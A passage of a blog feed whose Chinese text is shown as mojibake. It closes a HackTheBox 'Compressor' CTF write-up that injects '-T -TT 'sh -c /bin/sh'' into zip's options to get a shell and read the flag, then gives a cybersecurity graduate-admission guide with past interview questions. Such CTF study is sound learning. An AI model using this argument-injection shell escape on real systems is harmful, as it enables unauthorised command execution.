-rf ./*)</span><br><span class="line">6. Exit</span><br><span class="line"></span><br><span class="line">[*] Choose action: 3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Insert &lt;name&gt;.zip: a</span><br><span class="line">Insert &lt;name&gt;: a</span><br><span class="line">Insert &lt;options&gt;: -T -TT <span class="string">&#x27;sh -c /bin/sh&#x27;</span></span><br><span class="line">  adding: a (stored 0%)</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1000(ctf) gid=1000(ctf) <span class="built_in">groups</span>=1000(ctf)</span><br><span class="line"><span class="built_in">cat</span> ../../flag.txt</span><br><span class="line">HTB&#123;z1pp1ti_z0pp1t1_GTFO_0f_my_pr0p3rty&#125;</span><br></pre></td></tr></table></figure></div><p>é€™é‚Šæ˜¯åˆ©ç”¨ <code>zip</code> çš„åƒæ•¸ä¾†é–‹ shellï¼š</p><ul><li>-Tï¼šzip çš„ -T åƒæ•¸ä»£è¡¨ã€Œæ¸¬è©¦å£“ç¸®æ–‡ä»¶ã€ã€‚ä½¿ç”¨é€™å€‹åƒæ•¸æ™‚ï¼Œzip ä¸æœƒé€²è¡Œå£“ç¸®ï¼Œè€Œæ˜¯ç¢ºèªçµ¦å®šçš„å£“ç¸®æ–‡ä»¶çš„å®Œæ•´æ€§ã€‚</li><li>-TT <command>ï¼šé€™å€‹åƒæ•¸å…è¨±æŒ‡å®šä¸€å€‹æ¸¬è©¦å‘½ä»¤ä¾†é€²è¡Œå£“ç¸®æ–‡ä»¶çš„æ¸¬è©¦ã€‚ç„¶è€Œï¼Œå¤§éƒ¨åˆ†ç¾ä»£ zip å·¥å…·ä¸å†æ”¯æ´è©²åŠŸèƒ½ä¾†åŸ·è¡Œè‡ªå®šç¾©å‘½ä»¤ã€‚<br>ç„¶å¾Œæˆ‘å€‘å¯ä»¥é€šé -TT â€˜sh -c &#x2F;bin&#x2F;shâ€™ è©¦åœ–ç”¨ sh -c &#x2F;bin&#x2F;sh ä¾†é‹è¡Œä¸€å€‹äº¤äº’å¼ shellã€‚ sh -c æŒ‡å®šå°‡è¦é‹è¡Œçš„æŒ‡ä»¤ï¼Œè€Œ &#x2F;bin&#x2F;sh å‰‡æ‰“é–‹ä¸€å€‹æ–°çš„ shellã€‚</li></ul><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a class="link"   href="https://medium.com/@vs45sharma/hackthebox-compressor-challenge-b72d4c735cb" >https://medium.com/@vs45sharma/hackthebox-compressor-challenge-b72d4c735cb <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Exploitation&quot;&gt;&lt;a href=&quot;#Exploitation&quot; class=&quot;headerlink&quot; title=&quot;Exploitation&quot;&gt;&lt;/a&gt;Exploitation&lt;/h2&gt;&lt;p&gt;ç›´æ¥æ”¾è§£æ³•ï¼š&lt;/p&gt;
&lt;div class=&quot;highlig</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="misc" scheme="https://kazma.tw/tags/misc/"/>
    
    <category term="command injection" scheme="https://kazma.tw/tags/command-injection/"/>
    
  </entry>
  
  <entry>
    <title>é ‚å¤§è³‡å®‰ç ”ç©¶æ‰€æ¨ç”„å…¨æ”»ç•¥ï¼šæº–å‚™éç¨‹ã€æŠ€å·§åˆ†äº«èˆ‡é¢è©¦å¿ƒå¾—</title>
    <link href="https://kazma.tw/2024/11/02/%E9%A0%82%E5%B0%96%E8%B3%87%E5%AE%89%E7%A0%94%E7%A9%B6%E6%89%80%E6%8E%A8%E7%94%84%E5%85%A8%E6%94%BB%E7%95%A5%EF%BC%9A%E6%BA%96%E5%82%99%E9%81%8E%E7%A8%8B%E3%80%81%E6%8A%80%E5%B7%A7%E5%88%86%E4%BA%AB%E8%88%87%E9%9D%A2%E8%A9%A6%E5%BF%83%E5%BE%97/"/>
    <id>https://kazma.tw/2024/11/02/%E9%A0%82%E5%B0%96%E8%B3%87%E5%AE%89%E7%A0%94%E7%A9%B6%E6%89%80%E6%8E%A8%E7%94%84%E5%85%A8%E6%94%BB%E7%95%A5%EF%BC%9A%E6%BA%96%E5%82%99%E9%81%8E%E7%A8%8B%E3%80%81%E6%8A%80%E5%B7%A7%E5%88%86%E4%BA%AB%E8%88%87%E9%9D%A2%E8%A9%A6%E5%BF%83%E5%BE%97/</id>
    <published>2024-11-02T06:22:10.711Z</published>
    <updated>2024-11-04T07:18:21.837Z</updated>
    
    <content type="html"><![CDATA[<h2 id="äº¤å¤§è³‡å·¥æ‰€ä¸™çµ„"><a href="#äº¤å¤§è³‡å·¥æ‰€ä¸™çµ„" class="headerlink" title="äº¤å¤§è³‡å·¥æ‰€ä¸™çµ„"></a>äº¤å¤§è³‡å·¥æ‰€ä¸™çµ„</h2><h3 id="é¢è©¦"><a href="#é¢è©¦" class="headerlink" title="é¢è©¦"></a>é¢è©¦</h3><ul><li>è‡ªæˆ‘ä»‹ç´¹<ul><li>é‡é»æœƒæƒ³è¦å¼·èª¿å¯¦ä½œèƒ½åŠ›ï¼Œæ‰€ä»¥æˆ‘çš„éƒ¨åˆ†æœƒä¸»è¦åœç¹åœ¨å¥§ç¾©å¯¦ç¿’é–‹ç™¼çš„å·¥å…·ä»¥åŠå‡ºé¡Œçš„ç¶“é©—ï¼Œä¸€åˆ†é˜çš„å®¢è£½åŒ–è‡ªæˆ‘ä»‹ç´¹å¤§æ¦‚æœƒå¦‚ä¸‹ï¼š</li><li>å—¨å„ä½è©•å¯©å¥½ï¼Œæˆ‘æ˜¯ä¾†è‡ªåœ‹ç«‹æˆåŠŸå¤§å­¸çš„è‘‰æ±é€¸ï¼Œå¤§å­¸æœŸé–“æœ‰åœ¨ä¸‰å€‹åœ°æ–¹å¯¦ç¿’éï¼Œç›®å‰å‰‡æ˜¯åœ¨å¥§ç¾©æ™ºæ…§ç§‘æŠ€å¯¦ç¿’ï¼Œå‰é™£å­å¯¦ç¿’ç”Ÿæˆæœç™¼è¡¨äº†åŸºæ–¼é–‹æº AADInternal çš„å·¥å…·é–‹ç™¼äº†ä¸€å¥—é‡å°å…¨å°ç£ä¸Šå¸‚ä¸Šæ«ƒå…¬å¸çš„ Entra ID Recon å…¶ä¸­ä¹Ÿæœ‰ç™¼ç¾ä¸€äº›æœ‰è¶£çš„è³‡è¨Šã€‚é€™é™£å­å‰‡æ˜¯å‰›çµæŸäº† QNAP NAS åœ¨å‚™ä»½ M365 æ™‚å¯èƒ½æœ‰çš„ç›¸é—œæ¼æ´ã€‚ç„¶å¾Œåœ¨åœ‹å…§å¤–ä¹Ÿç´¯ç©äº†ä¸å°‘è³‡å®‰ç«¶è³½çš„æˆå°±ï¼Œå€¼å¾—ä¸€æçš„æ˜¯ä¸‹é€±æœƒä»£è¡¨å°ç£åƒåŠ  HITCON CTF Final è·Ÿå…¶ä»–åœ‹å®¶çš„é¸æ‰‹ç«¶çˆ­ï¼Œå±†æ™‚æœƒæ“”ä»»å¤§ PM è² è²¬æ•´å€‹åœ˜éšŠçš„è§£é¡Œæ§ç®¡è·ŸäººåŠ›èª¿åº¦ã€‚å¦å¤–é€™ä¸€å¹´ä¹Ÿé è¨ˆè·Ÿè‘—é»ƒä¿Šç©æ•™æˆåšç¬¦è™ŸåŸ·è¡Œç›¸é—œçš„ç ”ç©¶ï¼Œå¦å¤–åœ¨ç¤¾ç¾¤ä¸Šä¹Ÿæœ‰è¨±å¤šç¶“é©—åƒæ˜¯åœ¨ AIS3 æ“”ä»»å°ˆé¡Œè©•å¯©å’ŒåŠ©æ•™ä»¥åŠ Pre-exam è·Ÿ MyFirstCTF çš„å‡ºé¡Œè€…ã€‚ç„¶å¾Œå»å¹´ä¹Ÿå‰µè¾¦äº†å°ç£è³‡å®‰ç¤¾ç¾¤è¯ç›Ÿå’Œæˆå¤§è³‡å®‰ç¤¾ç›®å‰éƒ½æ“”ä»» leaderï¼Œæœ€è¿‘ä¹Ÿå‰›ç²é¸ DEVCORE å…¨åœ‹åƒ…é™ååçš„è³‡å®‰çå­¸é‡‘ï¼Œå› ç‚ºåœ¨ç¤¾ç¾¤ç´¯ç©çš„æˆå°±å’Œå½±éŸ¿åŠ›ï¼Œä¸‹å­¸æœŸä¹Ÿå—åˆ°åœ‹å®¶è³‡å®‰é™¢é‚€è«‹åœ¨æˆå¤§é–‹ä¸€å ‚ä¸‰å­¸åˆ†çš„è³‡å®‰é¸ä¿®èª²ã€‚</li></ul></li></ul><h3 id="æ€§å‘æ¸¬é©—è€ƒå¤é¡Œ"><a href="#æ€§å‘æ¸¬é©—è€ƒå¤é¡Œ" class="headerlink" title="æ€§å‘æ¸¬é©—è€ƒå¤é¡Œ"></a>æ€§å‘æ¸¬é©—è€ƒå¤é¡Œ</h3><p>å¦‚æœæœ‰é‡è¤‡å‡ºç¾çš„æœƒç›´æ¥æ‹¿æ‰</p><h4 id="113-è€ƒå¤é¡Œ"><a href="#113-è€ƒå¤é¡Œ" class="headerlink" title="113 è€ƒå¤é¡Œ"></a>113 è€ƒå¤é¡Œ</h4><ul><li><a class="link"   href="https://www.dcard.tw/f/graduate_school/p/253728478" >https://www.dcard.tw/f/graduate_school/p/253728478 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul><ol><li><p>Q: æœ‰ä¸€å€‹å…¨åŸŸè®Šæ•¸ countï¼Œä¸” main() æœƒåŸ·è¡Œå…©æ¬¡ inc_count() å‡½æ•¸ã€‚ç¾åœ¨æˆ‘å€‘å¸Œæœ›ä½¿ç”¨å…©å€‹åŸ·è¡Œç·’ï¼ˆthreadsï¼‰ä¾†åŒæ™‚åŸ·è¡Œé€™æ®µç¨‹å¼ç¢¼ã€‚è«‹å•è¦å¦‚ä½•é¿å…å¤šåŸ·è¡Œç·’æ“ä½œ count æ™‚ç™¼ç”Ÿç«¶çˆ­æ¢ä»¶çš„éŒ¯èª¤ï¼Ÿ</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> Count = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">inc_count</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">        count++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="built_in">inc_count</span>();</span><br><span class="line">    <span class="built_in">inc_count</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>A: è¦é¿å…å¤šåŸ·è¡Œç·’æ“ä½œå…¨åŸŸè®Šæ•¸ count æ™‚ç™¼ç”Ÿç«¶çˆ­æ¢ä»¶å•é¡Œï¼Œæˆ‘å€‘å¯ä»¥ä½¿ç”¨äº’æ–¥é–ï¼ˆmutexï¼‰ä¾†ä¿è­· count çš„è¨ªå•ã€‚é€™æ¨£å¯ä»¥ç¢ºä¿åªæœ‰ä¸€å€‹åŸ·è¡Œç·’åœ¨ä»»æ„æ™‚åˆ»ä¿®æ”¹ countï¼Œé¿å…å¤šåŸ·è¡Œç·’é€ æˆçš„æ•¸æ“šä¸ä¸€è‡´å•é¡Œã€‚ä»¥ä¸‹æ˜¯æ›´æ–°å¾Œçš„ç¨‹å¼ç¢¼ï¼Œä½¿ç”¨äº† std::mutex ä¾†ä¿è­· countï¼š</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mutex&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">std::mutex mtx;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">inc_count</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">std::lock_guard&lt;std::mutex&gt; <span class="title">lock</span><span class="params">(mtx)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">        count++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="function">std::thread <span class="title">t1</span><span class="params">(inc_count)</span></span>;</span><br><span class="line">    <span class="function">std::thread <span class="title">t2</span><span class="params">(inc_count)</span></span>;</span><br><span class="line"></span><br><span class="line">    t1.<span class="built_in">join</span>();</span><br><span class="line">    t2.<span class="built_in">join</span>();</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Count: &quot;</span> &lt;&lt; count &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li><p>Q: æœ‰ä¸€å€‹å‡½æ•¸ f(int num)ï¼Œå®ƒæ¥å—ä¸€å€‹æ•´æ•¸ num ä½œç‚ºåƒæ•¸ï¼Œä¸¦å°è©²æ•¸å­—é€²è¡Œä¸€ç³»åˆ—ä½å…ƒæ“ä½œï¼ˆå·¦ç§»å’Œå³ç§»ï¼‰ï¼Œæœ€çµ‚è¿”å›ä¸€å€‹æ•´æ•¸çµæœã€‚æˆ‘å€‘éœ€è¦æ ¹æ“šçµ¦å®šçš„æ•¸å­— 11 ä¾†åŸ·è¡Œé€™å€‹å‡½æ•¸ï¼Œä¸¦è¨ˆç®—å‡ºè©²æ•¸å­—ç¶“éä½å…ƒæ“ä½œå¾Œçš„è¼¸å‡ºçµæœï¼ˆåŒ…å«äºŒé€²ä½å’Œåé€²ä½æ ¼å¼ï¼‰ã€‚<br>A: ç„¡æ³•ä½œç­”ã€‚</p></li><li><p>Q1: ç‚ºä»€éº¼ RAM å®¹é‡æå‡ä¸¦æœªç·šæ€§æé«˜ç¨‹å¼åŸ·è¡Œé€Ÿåº¦ï¼Ÿ<br>A1: </p><ul><li>CPU ç“¶é ¸ï¼šè‹¥ CPU æ•ˆèƒ½é™åˆ¶äº†è™•ç†é€Ÿåº¦ï¼Œå¢åŠ  RAM ä¸æœƒæé«˜ CPU çš„è™•ç†èƒ½åŠ›ã€‚</li><li>I&#x2F;O ç“¶é ¸ï¼šè‹¥ç¨‹å¼é »ç¹å­˜å–ç¡¬ç¢Ÿï¼Œå­˜å–é€Ÿåº¦å—é™æ–¼ç¡¬ç¢Ÿæˆ– SSD çš„è®€å¯«é€Ÿåº¦ã€‚</li><li>è»Ÿé«”æ¶æ§‹é™åˆ¶ï¼šæŸäº›ç¨‹å¼å¯èƒ½ç„¡æ³•æœ‰æ•ˆåˆ©ç”¨é¡å¤–çš„ RAMï¼Œä¾‹å¦‚å–®ä¸€ç·šç¨‹ç¨‹å¼ç„¡æ³•åˆ©ç”¨å¤šæ ¸å¿ƒæˆ–å¤šåŸ·è¡Œç·’å„ªå‹¢ã€‚</li><li>ä½œæ¥­ç³»çµ±çš„å…§å­˜ç®¡ç†ï¼šä½œæ¥­ç³»çµ±å¯èƒ½æœªå……åˆ†ä½¿ç”¨æ–°å¢çš„ RAMï¼Œæˆ–æœªæœ‰æ•ˆç®¡ç†å…§å­˜åˆ†é…ï¼Œå°è‡´é¡å¤– RAM æœªè¢«å®Œå…¨åˆ©ç”¨ã€‚</li></ul><p>Q2: é€šè¨Šè»Ÿé«”åœ¨å‚³éè¨Šæ¯æ™‚ï¼Œä½¿ç”¨è€…ç«¯åŠä¼ºæœå™¨ç«¯çš„å®Œæ•´éç¨‹ï¼Ÿ<br>A2: </p><ul><li>ç”¨æˆ¶ç«¯ç™¼é€è¨Šæ¯ï¼š<ol><li>   è¼¸å…¥ï¼šç”¨æˆ¶åœ¨æ‡‰ç”¨ç¨‹å¼ä¸­è¼¸å…¥è¨Šæ¯ï¼ŒæŒ‰ä¸‹ã€Œå‚³é€ã€æŒ‰éˆ•ã€‚</li><li>   å°åŒ…è™•ç†ï¼šæ‡‰ç”¨ç¨‹å¼å°‡è¨Šæ¯é€²è¡Œåºåˆ—åŒ–ï¼Œå°è£æˆç‰¹å®šæ ¼å¼ï¼ˆå¦‚ JSONï¼‰ã€‚</li><li>   åŠ å¯†ï¼šè¨Šæ¯ç¶“éåŠ å¯†ï¼ˆå¦‚ TLSï¼‰ï¼Œç¢ºä¿åœ¨å‚³è¼¸éç¨‹ä¸­ä¿è­·è³‡æ–™å®‰å…¨ã€‚</li><li>   é€£æ¥ä¼ºæœå™¨ï¼šç”¨æˆ¶ç«¯é€éç¶²è·¯å”è­°ï¼ˆå¦‚ TCP&#x2F;IPï¼‰å°‡è¨Šæ¯å‚³é€åˆ°ä¼ºæœå™¨ï¼Œè³‡æ–™é€šéç¶²å¡å‚³éè‡³ç¶²è·¯ã€‚</li></ol></li><li>ä¼ºæœå™¨è™•ç†è¨Šæ¯ï¼š<ol><li>   æ¥æ”¶è«‹æ±‚ï¼šä¼ºæœå™¨çš„ç¶²è·¯è¨­å‚™æ¥æ”¶åˆ°è¨Šæ¯è«‹æ±‚ã€‚</li><li>   è§£å¯†ï¼šä¼ºæœå™¨æ ¹æ“šåŠ å¯†å”è­°ï¼ˆå¦‚ TLSï¼‰è§£å¯†è¨Šæ¯ï¼Œé‚„åŸå‡ºç”¨æˆ¶ç«¯å‚³ä¾†çš„å…§å®¹ã€‚</li><li>   é©—è­‰èº«ä»½ï¼šä¼ºæœå™¨ç¢ºèªç”¨æˆ¶èº«ä»½ï¼ˆå¦‚ JWT é©—è­‰ï¼‰ï¼Œç¢ºä¿è¨Šæ¯ä¾†è‡ªåˆæ³•çš„ç”¨æˆ¶ã€‚</li><li>   å­˜å„²ï¼šè¨Šæ¯å„²å­˜æ–¼ä¼ºæœå™¨çš„è³‡æ–™åº«ä¸­ï¼Œä¸¦å°‡è³‡æ–™æ›´æ–°è‡³ç”¨æˆ¶çš„è¨Šæ¯æ­·å²ä¸­ã€‚</li><li>   é€šçŸ¥æ¥æ”¶ç«¯ï¼šä¼ºæœå™¨å°‹æ‰¾æ¥æ”¶è€…çš„ç‹€æ…‹ï¼Œè‹¥å°æ–¹åœ¨ç·šï¼Œå‰‡ç™¼é€é€šçŸ¥ï¼›è‹¥ä¸åœ¨ç·šï¼Œå‰‡å°‡è¨Šæ¯æ¨™è¨˜ç‚ºã€Œæœªè®€ã€ã€‚</li></ol></li><li>ç”¨æˆ¶ç«¯æ¥æ”¶è¨Šæ¯ï¼š<ol><li>   é€£æ¥ä¼ºæœå™¨ï¼šæ¥æ”¶æ–¹çš„ç”¨æˆ¶ç«¯é€šéç¶²è·¯å”è­°é€£æ¥ä¼ºæœå™¨ä¸¦æ¥æ”¶è¨Šæ¯ã€‚</li><li>   è§£å¯†è¨Šæ¯ï¼šç”¨æˆ¶ç«¯è§£å¯†è¨Šæ¯ä»¥ç²å–å…¶å…§å®¹ã€‚</li><li>   é¡¯ç¤ºè¨Šæ¯ï¼šè¨Šæ¯é¡¯ç¤ºåœ¨ä½¿ç”¨è€…ç•Œé¢ä¸­ï¼Œé€šçŸ¥ç”¨æˆ¶æœ‰æ–°çš„è¨Šæ¯ã€‚</li></ol></li></ul></li><li><p>Q: å‚³é€ä¸€å€‹è¨Šæ¯åˆ° LINE æˆ–å…¶ä»–å³æ™‚é€šè¨Šè»Ÿé«”ï¼Œä¸­é–“éç¨‹ç‚ºä½•ï¼Ÿ<br>A:</p><ol><li>   Edge-computingï¼šè¨Šæ¯åœ¨é è¿‘ä½¿ç”¨è€…çš„è£ç½®æˆ–æœ¬åœ°ä¼ºæœå™¨è™•ç†èˆ‡å„²å­˜ï¼Œå¿«é€ŸéŸ¿æ‡‰ä½†ä¾è³´è£ç½®çš„é‹ç®—èƒ½åŠ›ã€‚ä½¿ç”¨è€…çš„è£ç½®é€é socket é€£æ¥ä¼ºæœå™¨ï¼Œè¨Šæ¯é€é device I&#x2F;O å‚³éï¼Œå†ç¶“éæ‡‰ç”¨å±¤ã€å®‰å…¨å±¤ç­‰è™•ç†ï¼Œå¿«é€Ÿé€é”å°æ–¹ã€‚</li><li>   Cloud-computingï¼šè¨Šæ¯ç¶“é socket å‚³è‡³é›²ç«¯ä¼ºæœå™¨è™•ç†ã€‚é›²ç«¯è² è²¬æ‰€æœ‰å±¤ç´šçš„è™•ç†ï¼ˆåŒ…æ‹¬æ‡‰ç”¨å±¤ã€å®‰å…¨å±¤ã€åŠ å¯†ç­‰ï¼‰ï¼Œä¸¦é€šéä¼ºæœå™¨é–“é€£çµè½‰é€è‡³æ¥æ”¶ç«¯ã€‚æ­¤æ–¹å¼ä¸ä¾è³´æœ¬åœ°è£ç½®ï¼Œèƒ½æ“´å±•å¤§é‡ç”¨æˆ¶ï¼Œä½†å—é™æ–¼ç¶²è·¯å»¶é²ã€‚</li><li>   Hybridï¼šçµåˆ edge å’Œ cloudï¼Œè¨Šæ¯çš„å³æ™‚æ€§éœ€æ±‚éƒ¨åˆ†åœ¨æœ¬åœ°ç«¯è™•ç†ï¼Œéå³æ™‚æ•¸æ“šåœ¨é›²ç«¯å­˜å–ã€‚é‡è¦è¨Šæ¯å…ˆåœ¨ edge ç«¯ç¶“ socket é€£è‡³é›²ç«¯ï¼Œé€é layer è™•ç†å¾Œé€²è¡Œå‚³é€ï¼Œé”åˆ°æ•ˆç‡èˆ‡å½ˆæ€§å…¼å…·çš„æ•ˆæœã€‚</li></ol></li><li><p>Q: è¨­è¨ˆä¸€å€‹é¢éƒ¨è­˜åˆ¥è§£é–ç³»çµ±çš„æ¶æ§‹ï¼ˆä¾‹å¦‚ç”¨æ–¼æ‰‹æ©Ÿæˆ–é–€é–ï¼‰ï¼Œä¸¦è§£é‡‹ä¸‰ç¨®è»Ÿé«”æ¶æ§‹çš„è¨­è¨ˆæƒ…æ³ï¼šå…¨éƒ¨é‹è¡Œåœ¨è£ç½®ä¸Šï¼ˆon-deviceï¼‰ã€å…¨éƒ¨é‹è¡Œåœ¨é›²ç«¯ä¸Šï¼ˆcloud-basedï¼‰ã€ä»¥åŠæ··åˆæ¨¡å¼ï¼ˆhybridï¼‰ã€‚å¦å¤–ï¼Œçµåˆ DevOps å’Œ MLOps çš„æ¦‚å¿µï¼Œèªªæ˜é€™äº›æ¶æ§‹å¦‚ä½•å½±éŸ¿é–‹ç™¼èˆ‡éƒ¨ç½²æµç¨‹ã€‚<br>A: </p><ul><li>å…¨éƒ¨é‹è¡Œåœ¨è£ç½®ä¸Šï¼ˆOn-Deviceï¼‰<ul><li>æ¶æ§‹ï¼šæ¨¡å‹æ¨ç†å’Œé©—è­‰å…¨éƒ¨åœ¨è£ç½®å…§å®Œæˆã€‚</li><li>å„ªé»ï¼šä½å»¶é²ã€å³æ™‚åæ‡‰ã€ä¿è­·éš±ç§ã€‚</li><li>æŒ‘æˆ°ï¼šä¾è³´è£ç½®æ€§èƒ½ï¼Œæ›´æ–°æ¨¡å‹å›°é›£ã€‚</li><li>DevOps&#x2F;MLOpsï¼šéœ€è£ç½®ç«¯æ¸¬è©¦èˆ‡å…¼å®¹æ€§ç®¡ç†ï¼Œæ¨¡å‹æ›´æ–°è¼ƒå°‘ä¸”éœ€æ‰‹å‹•åŒæ­¥ã€‚</li></ul></li><li>å…¨éƒ¨é‹è¡Œåœ¨é›²ç«¯ä¸Šï¼ˆCloud-Basedï¼‰<ul><li>æ¶æ§‹ï¼šè£ç½®å°‡å½±åƒå‚³è‡³é›²ç«¯é€²è¡Œè™•ç†ï¼Œçµæœè¿”å›ã€‚</li><li>å„ªé»ï¼šè£ç½®ç«¯è² æ“”è¼•ï¼Œæ¨¡å‹éš¨æ™‚å¯æ›´æ–°ã€‚</li><li>æŒ‘æˆ°ï¼šä¾è³´ç¶²è·¯é€£æ¥ï¼Œæœ‰å»¶é²èˆ‡éš±ç§é¢¨éšªã€‚</li><li>DevOps&#x2F;MLOpsï¼šå¿«é€Ÿè¿­ä»£ï¼Œé›†ä¸­éƒ¨ç½²ï¼Œé›²ç«¯æ¨¡å‹æ˜“æ–¼è‡ªå‹•åŒ–è¨“ç·´èˆ‡æ›´æ–°ã€‚</li></ul></li><li>æ··åˆæ¨¡å¼ï¼ˆHybridï¼‰<ul><li>æ¶æ§‹ï¼šè£ç½®é€²è¡Œåˆæ­¥æ¨ç†ï¼Œéœ€é«˜æº–åº¦æ™‚è½‰è‡³é›²ç«¯é©—è­‰ã€‚</li><li>å„ªé»ï¼šå¹³è¡¡å³æ™‚æ€§å’Œç²¾ç¢ºæ€§ã€‚</li><li>æŒ‘æˆ°ï¼šéœ€ç®¡ç†è£ç½®å’Œé›²ç«¯é–“çš„å”åŒã€‚</li><li>DevOps&#x2F;MLOpsï¼šé›™ç«¯æ¸¬è©¦ï¼Œä¿æŒæ¨¡å‹ä¸€è‡´æ€§ï¼Œé›²ç«¯æ›´æ–°éœ€åŒæ­¥è‡³è£ç½®ã€‚</li></ul></li></ul></li><li><p>Q: æ ¹æ“š Amdahlâ€™s Lawï¼Œæœ‰ä¸€ç¨‹å¼çš„ 10% éƒ¨åˆ†è¢«åŠ é€Ÿäº† 90 å€ï¼Œè«‹å•æ•´é«”çš„åŸ·è¡Œé€Ÿåº¦åŠ å¿«å¤šå°‘ï¼Ÿ<br>A: <img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/1.1.png"                      alt="1.1"                ><br>è²¼å¿ƒå°æé†’ï¼š<br>è«‹æº–å‚™ä¸€åˆ†é˜çš„è‡ªæˆ‘ä»‹ç´¹ï¼ŒåŒ…å«ï¼š</p><ul><li>å­¸æ ¡&#x2F;ç³»åˆ¥&#x2F;å·¥ä½œ</li><li>ä½ æ¯”è¼ƒæœ‰èˆˆè¶£çš„é ˜åŸŸè·Ÿå¾—æ„ä½œå“ç­‰ç­‰ï¼Œæœ‰çµ¦ä¸€äº›é ˜åŸŸåƒè€ƒï¼ˆç¨‹å¼è¨­è¨ˆã€æ¼”ç®—æ³•ã€å¤šåª’é«”ã€AIã€ç¶²é ã€è³‡å®‰ï¼‰</li></ul></li></ol><h4 id="112-è€ƒå¤é¡Œ"><a href="#112-è€ƒå¤é¡Œ" class="headerlink" title="112 è€ƒå¤é¡Œ"></a>112 è€ƒå¤é¡Œ</h4><ul><li><a class="link"   href="https://hackmd.io/@jotpac/HkVSK3Hps" >https://hackmd.io/@jotpac/HkVSK3Hps <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul><ol><li>Q: ä»€éº¼æ˜¯ Kernelï¼Ÿå®ƒå¦‚ä½•é‹ä½œï¼Ÿå¦‚ä½•é€²è¡Œ debugï¼Ÿ<br>A: Kernel æ˜¯æ“ä½œç³»çµ±çš„æ ¸å¿ƒï¼Œè² è²¬ç®¡ç†ç¡¬é«”è³‡æºå’Œèˆ‡è»Ÿé«”çš„æºé€šï¼Œé€éç³»çµ±å‘¼å«æä¾›å®‰å…¨çš„ç¡¬é«”è¨ªå•ã€‚é‹ä½œä¸Šï¼ŒKernel åœ¨é–‹æ©Ÿæ™‚è¼‰å…¥ä¸¦å¸¸é§å…§å­˜ï¼Œç®¡ç†å…§å­˜ã€è™•ç†å™¨è³‡æºåŠ I&#x2F;O ç­‰åŠŸèƒ½ã€‚debug æ–¹æ³•å¯ä½¿ç”¨ gdb æ­é… qemu æ¨¡æ“¬ã€ftrace è¿½è¹¤å…§æ ¸äº‹ä»¶ï¼Œæˆ–ç”¨ dmesg æª¢æŸ¥ Kernel æ—¥èªŒç­‰æ–¹å¼ã€‚</li><li>   Q: ä»€éº¼æ˜¯ Clangï¼Ÿæœ‰ä»€éº¼ç”¨é€”ï¼Ÿ<br>  A: Clang æ˜¯ä¸€å€‹ Cã€C++ å’Œå…¶ä»–ç·¨ç¨‹èªè¨€çš„ç·¨è­¯å™¨å‰ç«¯ï¼ŒåŸºæ–¼ LLVMã€‚Clang å…·æœ‰é«˜æ•ˆçš„ç·¨è­¯é€Ÿåº¦å’Œæ¸…æ™°çš„éŒ¯èª¤è¨Šæ¯ï¼Œå¸¸ç”¨æ–¼ç³»çµ±è»Ÿé«”é–‹ç™¼ã€ç¨‹å¼åˆ†æå’Œç·¨è­¯å„ªåŒ–ã€‚</li><li>   Q: MMIOï¼ˆMemory-Mapped I&#x2F;Oï¼‰ æ˜¯ä»€éº¼ï¼Ÿ<br>  A: MMIO å°‡ç¡¬é«”è¨­å‚™çš„ I&#x2F;O å¯„å­˜å™¨æ˜ å°„åˆ°ç³»çµ±è¨˜æ†¶é«”ç©ºé–“ï¼Œä½¿ CPU 